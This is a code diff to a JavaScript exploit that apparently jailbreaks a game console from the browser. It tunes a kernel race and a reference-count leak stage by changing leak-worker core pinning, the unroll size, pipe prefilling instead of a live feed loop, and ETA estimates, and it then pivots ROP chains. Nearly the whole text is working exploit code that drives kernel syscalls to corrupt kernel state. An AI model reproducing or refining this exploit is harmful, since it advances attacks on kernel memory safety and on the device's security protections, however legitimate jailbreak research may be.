@@ -130,23 +130,32 @@
         // Still 3x p2jb's original 64 and still ONE fireSync wake, which is what keeps the
         // free and the spray on the same core.
         const NUM_IPV6_SOCKETS = 192;
-        // TURBO (default): pin the JS feed loop onto the executor core and run leak
-        // workers on every other allowed core. The old "fast" plan failed because the
-        // unpinned JS thread landed on saturated leak cores; pinning fixes that.
-        // ?safe=1: conservative plan (one free core, 8192 unroll, 500ms feed cadence).
+        // MAX (default): matem6 4-leak-core plan + pre-filled pipes (no live feed loop).
+        // ?pf=1: legacy pipe-fed loop (original luac0re pacing, for debugging).
         let MAIN_CORE = 4;
         const MAIN_RTPRIO = 256;
         let LEAK_CORES = [0, 1, 2, 3];
-        const _safe_turbo = /\bsafe=1\b/.test(location.search);
+        const _pipe_feed = /\bpf=1\b/.test(location.search);
         (function planCores() {
             const a = window.P2JB_ALLOWED_CORES;
-            if (!Array.isArray(a) || a.length < 2) return;
+            if (!Array.isArray(a) || a.length < 3) return;
             MAIN_CORE = a[a.length - 1];
-            if (_safe_turbo && a.length >= 3)
-                LEAK_CORES = a.slice(0, a.length - 2);
-            else
-                LEAK_CORES = a.slice(0, a.length - 1);
+            LEAK_CORES = a.slice(0, a.length - 2);
         })();
+
+        function pipe_fill_sync(wfd, count, buf, chunk) {
+            let left = count;
+            let spins = 0;
+            while (left > 0n) {
+                let want = left;
+                if (want > BigInt(chunk)) want = BigInt(chunk);
+                const n = syscall(SYSCALL.write, BigInt(wfd), buf, want);
+                if (n > 0n && n <= want) { left -= n; spins = 0; continue; }
+                syscall(SYSCALL.sched_yield);
+                if (++spins > 500000)
+                    fail("pipe burst stalled: left=" + left);
+            }
+        }
 
         const SYSCALL_EXTRA = {
             recvmsg: 0x1bn,
@@ -881,7 +890,7 @@
         async function setup_workers(S) {
             window.syncMark("SETUP-WORKERS-ENTER", "iov=" + IOV_THREAD_NUM + " uio=" + UIO_THREAD_NUM);
             window.liveStatus("cores: leak=[" + LEAK_CORES.join(",") + "] exec=" + MAIN_CORE
-                + (_safe_turbo ? " (safe)" : " (turbo)")
+                + (_pipe_feed ? " (pipe-feed pf=1)" : " (max prefill)")
                 + "\nSETUP - spawning " + (IOV_THREAD_NUM + UIO_THREAD_NUM * 2) + " racer threads (thr_new)");
             S.iov_ws = make_worker_sync(IOV_THREAD_NUM);
             S.uio_read_ws = make_worker_sync(UIO_THREAD_NUM);
@@ -1546,7 +1555,7 @@
 
             syscall(SYSCALL.setuid, 1n);
 
-            await js_sleep(_safe_turbo ? 2000 : 500);
+            await js_sleep(1000);
 
             // FAST-ITERATION MODE (?skipleak=1): run the IDENTICAL code path but with a
             // tiny syscall budget so the ~40min cr_ref feed finishes in seconds. The race
@@ -1560,21 +1569,14 @@
 
             const POC_ARG = 0x800000000000n;
             const EXIT_MARK = 0xDEADn;
-            const LEAK_UNROLL = _safe_turbo ? 8192 : 16384;
+            const LEAK_UNROLL = _pipe_feed ? 4096 : 32768;
             const U = BigInt(LEAK_UNROLL);
-            const FEED_CHUNK = _safe_turbo ? 8192 : 65536;
-            const PIPE_BUF = 65536n;
-            const FEED_STALL_MS = _safe_turbo ? 500 : 25;
-
-            if (!_safe_turbo) {
-                pin_to_core(MAIN_CORE);
-                window.syncMark("TURBO-PIN",
-                    "feed_core=" + MAIN_CORE + " on=" + get_current_core()
-                    + " leak_n=" + LEAK_CORES.length);
-            }
+            const FEED_CHUNK = _pipe_feed ? 4096 : 65536;
+            const leak_mode = _pipe_feed ? "pf" : "pp";
+            window.syncMark("LEAK-MODE", leak_mode + " unroll=" + LEAK_UNROLL
+                + " cores=" + LEAK_CORES.length);
 
             const NW = LEAK_CORES.length;
-
             const chunkbuf = malloc(FEED_CHUNK);
 
             const base_share = TOTAL_SYSCALLS / BigInt(NW);
@@ -1601,10 +1603,15 @@
                 const chain = build_leak_worker_chain(
                     LEAK_CORES[w], rfd, finished, dummybuf, LEAK_UNROLL,
                     Number(remainder_w));
+                if (!_pipe_feed && normal_w > 65535n)
+                    fail("pp: normal_w=" + normal_w + " > pipe cap; lower unroll or use ?pf=1");
                 await ulog("SPAWN-" + w + "-PRE core=" + LEAK_CORES[w] + " entry=" + toHex(chain.entry));
                 const _th = spawn_leak_worker(chain.entry);
-                await ulog("SPAWN-" + w + "-POST handle=" + toHex(_th));
-                await js_sleep(_safe_turbo ? 50 : 25);
+                if (!_pipe_feed)
+                    pipe_fill_sync(wfd, normal_w, chunkbuf, FEED_CHUNK);
+                await ulog("SPAWN-" + w + "-POST handle=" + toHex(_th)
+                    + (_pipe_feed ? "" : " burst=" + normal_w));
+                await js_sleep(100);
                 await ulog("SPAWN-" + w + "-ALIVE main survived after worker " + w);
                 const pendbuf = malloc(4); write32(pendbuf, 0n);
                 lws.push({
@@ -1612,112 +1619,88 @@
                     normal: normal_w, queued: 0n
                 });
             }
-            await ulog("SPAWN-DONE all " + NW + " workers spawned, entering feed");
-            window.liveStatus("STAGE 0 - leak workers up, starting feed", 0);
+            await ulog("SPAWN-DONE all " + NW + " workers spawned, entering leak");
+            window.liveStatus("STAGE 0 - leak workers up"
+                + (_pipe_feed ? ", pipe-feed" : ", max burst"), 0);
 
-            let all_fed = false;
             const total_need = lws.reduce((a, l) => a + l.normal, 0n);
             let feedLiveMs = 0;
+
+            if (_pipe_feed) {
+            let all_fed = false;
             while (!all_fed) {
                 all_fed = true;
-                let any_wrote = false;
+                for (const lw of lws) {
+                    if (lw.queued < lw.normal) {
+                        all_fed = false;
+                        let want = lw.normal - lw.queued;
+                        if (want > BigInt(FEED_CHUNK)) want = BigInt(FEED_CHUNK);
+                        const n = syscall(SYSCALL.write, BigInt(lw.wfd), chunkbuf, want);
+                        if (n > 0n && n <= BigInt(FEED_CHUNK)) lw.queued += n;
+                    }
+                }
                 let pending = 0n, fioOK = true;
-                const pendings = new Array(lws.length);
-                for (let i = 0; i < lws.length; i++) {
-                    const l = lws[i];
+                for (const l of lws) {
                     write32(l.pendbuf, 0n);
                     const r = syscall(SYSCALL.ioctl, BigInt(l.rfd), FIONREAD, l.pendbuf);
                     if ((r & 0xFFFFFFFFn) !== 0n) { fioOK = false; break; }
-                    const pw = read32(l.pendbuf) & 0xFFFFFFFFn;
-                    pendings[i] = pw;
-                    pending += pw;
-                }
-                if (!fioOK) pending = 0n;
-                for (let i = 0; i < lws.length; i++) {
-                    const lw = lws[i];
-                    if (lw.queued >= lw.normal) continue;
-                    all_fed = false;
-                    let want = lw.normal - lw.queued;
-                    if (!_safe_turbo) {
-                        const room = PIPE_BUF - pendings[i];
-                        if (room <= 0n) continue;
-                        if (want > room) want = room;
-                    }
-                    if (want > BigInt(FEED_CHUNK)) want = BigInt(FEED_CHUNK);
-                    if (want <= 0n) continue;
-                    const n = syscall(SYSCALL.write, BigInt(lw.wfd), chunkbuf, want);
-                    if (n > 0n && n <= want) { lw.queued += n; any_wrote = true; }
+                    pending += read32(l.pendbuf) & 0xFFFFFFFFn;
                 }
                 if (!window.__fioMarked) {
                     window.__fioMarked = 1;
-                    window.syncMark("FIONREAD", "ok=" + fioOK + " pending=" + pending
-                        + " turbo=" + (_safe_turbo ? 0 : 1));
+                    window.syncMark("FIONREAD", "ok=" + fioOK + " pending=" + pending + " mode=pf");
                 }
+                if (!fioOK) pending = 0n;
                 const fed_b = lws.reduce((a, l) => a + l.queued, 0n);
                 let done_b = fed_b - pending;
                 if (done_b < 0n) done_b = 0n;
                 const pct = Number((done_b * 10000n) / total_need) / 100;
-                const now = Date.now();
-                if (now - feedLiveMs >= (_safe_turbo ? 500 : 1000)) {
-                    feedLiveMs = now;
-                    window.liveStatus(
-                        "STAGE 0 - cr_ref leak (" + NW + " cores, " + LEAK_UNROLL + "x unroll"
-                        + (_safe_turbo ? ", safe" : ", turbo") + ")\n"
-                        + "consumed " + done_b + " / " + total_need + " bytes = "
-                        + (done_b * U) + " kqueueex\n"
-                        + "queued " + fed_b + "  in-pipe " + pending + "\n"
-                        + "per-core: " + lws.map(l => (Number((l.queued * 1000n) / l.normal) / 10).toFixed(1) + "%").join("  "),
-                        pct, "leak");
-                }
-                if (!all_fed) await js_sleep(any_wrote ? 0 : FEED_STALL_MS);
+                window.liveStatus(
+                    "STAGE 0 - cr_ref leak (" + NW + " cores, " + LEAK_UNROLL + "x, pf)\n"
+                    + "consumed " + done_b + " / " + total_need + " = " + (done_b * U) + " kqueueex",
+                    pct, "leak");
+                await js_sleep(500);
             }
-            window.liveStatus("STAGE 0 - feed COMPLETE, draining workers", 100, "leak");
-
-            // DRAIN PHASE. The feed loop has queued every byte, but up to 64KB per worker
-            // is still sitting in the pipes. Progress reporting continues through drain.
-            const drainPending = () => {
-                let pend = 0n;
+            for (let di = 0; di < lws.length; di++) {
+                const lw = lws[di];
+                while (true) {
+                    write64(lw.finished, 0n);
+                    await js_sleep(500);
+                    if (read64(lw.finished) === 0n) break;
+                }
+            }
+            } else {
+            for (const lw of lws) lw.queued = lw.normal;
+            let pp_done = false;
+            while (!pp_done) {
+                pp_done = true;
+                let pending = 0n, fioOK = true;
                 for (const l of lws) {
                     write32(l.pendbuf, 0n);
                     const r = syscall(SYSCALL.ioctl, BigInt(l.rfd), FIONREAD, l.pendbuf);
-                    if ((r & 0xFFFFFFFFn) !== 0n) return null;   // unreadable: fall back to elapsed
-                    pend += read32(l.pendbuf) & 0xFFFFFFFFn;
+                    if ((r & 0xFFFFFFFFn) !== 0n) { fioOK = false; break; }
+                    pending += read32(l.pendbuf) & 0xFFFFFFFFn;
                 }
-                return pend;
-            };
-            const drainReport = (di) => {
-                const pend = drainPending();
-                if (pend === null) {
-                    window.liveStatus("STAGE 0 - DRAINING pipes (worker " + (di + 1) + "/" + lws.length + ")"
-                        + "\nFIONREAD unavailable - no byte count, still draining", -1, "drain");
-                    return;
+                if (!window.__fioMarked) {
+                    window.__fioMarked = 1;
+                    window.syncMark("FIONREAD", "ok=" + fioOK + " pending=" + pending + " mode=pp");
                 }
-                const done_b = total_need > pend ? total_need - pend : total_need;
+                if (!fioOK) pending = 0n;
+                if (pending > 0n) pp_done = false;
+                const done_b = total_need > pending ? total_need - pending : total_need;
                 const pct = Number((done_b * 10000n) / total_need) / 100;
-                window.liveStatus("STAGE 0 - DRAINING buffered backlog"
-                    + "\nworkers are consuming the bytes already queued in the pipes"
-                    + "\nconsumed " + done_b + " / " + total_need + " bytes = "
-                    + (done_b * U) + " kqueueex"
-                    + "\nstill in pipes " + pend + "   worker " + (di + 1) + "/" + lws.length,
-                    pct, "drain");
-            };
-            drainReport(0);
-            const drainPollMs = _safe_turbo ? 500 : 100;
-            for (let di = 0; di < lws.length; di++) {
-                const lw = lws[di];
-                window.syncMark("DRAIN", "worker=" + di + "/" + lws.length + " waiting");
-                let spins = 0;
-                while (true) {
-                    write64(lw.finished, 0n);
-                    await js_sleep(drainPollMs);
-                    if (read64(lw.finished) === 0n) break;
-                    drainReport(di);
-                    if ((++spins % 20) === 0)
-                        window.syncMark("DRAIN", "worker=" + di + " still draining, " + (spins * 1.5) + "s");
+                const now = Date.now();
+                if (now - feedLiveMs >= 1000) {
+                    feedLiveMs = now;
+                    window.liveStatus(
+                        "STAGE 0 - cr_ref leak (" + NW + " cores, " + LEAK_UNROLL + "x, max)\n"
+                        + "consumed " + done_b + " / " + total_need + " = "
+                        + (done_b * U) + " kqueueex  in-pipe " + pending,
+                        pct, "leak");
                 }
-                window.syncMark("DRAIN", "worker=" + di + " DONE");
+                if (!pp_done) await js_sleep(500);
             }
-            window.liveStatus("STAGE 0 - drain COMPLETE, all workers idle", 100, "drain");
+            }
 
             for (const lw of lws) {
                 write64(lw.chain.pivotAddr, lw.chain.exitAddr);
@@ -4230,32 +4213,27 @@
             " victim=" + S.victim_rfd + "," + S.victim_wfd);
 
         const leak_nw = LEAK_CORES.length;
-        // Turbo: max leak cores + pinned feed + 16384 unroll + adaptive pipe fill.
-        // Still bounded by ~2^32 kqueueex total; web path ceiling ~30-38 min on 12.40.
+        // MAX (pp): 4 leak cores, 32768 unroll, burst prefill, KQ-TOPUP safety net.
         let eta_minutes;
-        if (_safe_turbo) {
+        if (_pipe_feed) {
             switch (leak_nw) {
                 case 1: eta_minutes = 120; break;
                 case 2: eta_minutes = 75; break;
                 case 3: eta_minutes = 55; break;
-                case 4: eta_minutes = 46; break;
-                case 5: eta_minutes = 40; break;
-                default: eta_minutes = Math.max(20, Math.round(46 * 4 / leak_nw)); break;
+                case 4: eta_minutes = 50; break;
+                default: eta_minutes = Math.max(25, Math.round(50 * 4 / leak_nw)); break;
             }
         } else {
             switch (leak_nw) {
-                case 1: eta_minutes = 90; break;
-                case 2: eta_minutes = 55; break;
-                case 3: eta_minutes = 38; break;
-                case 4: eta_minutes = 32; break;
-                case 5: eta_minutes = 28; break;
-                case 6: eta_minutes = 24; break;
-                default: eta_minutes = Math.max(18, Math.round(32 * 4 / leak_nw)); break;
+                case 1: eta_minutes = 100; break;
+                case 2: eta_minutes = 60; break;
+                case 3: eta_minutes = 42; break;
+                case 4: eta_minutes = 38; break;
+                default: eta_minutes = Math.max(22, Math.round(38 * 4 / leak_nw)); break;
             }
         }
-        window.syncMark("LEAK-TUNE", "cores=" + leak_nw + " unroll="
-            + (_safe_turbo ? 8192 : 16384) + " turbo=" + (_safe_turbo ? 0 : 1)
-            + " eta_min=" + eta_minutes);
+        window.syncMark("LEAK-TUNE", "mode=" + (_pipe_feed ? "pf" : "pp") + " cores=" + leak_nw
+            + " unroll=" + (_pipe_feed ? 4096 : 32768) + " eta_min=" + eta_minutes);
         const eta_str = eta_minutes < 60
             ? "~" + eta_minutes + " min"
             : "~" + Math.floor(eta_minutes / 60) + "h" +
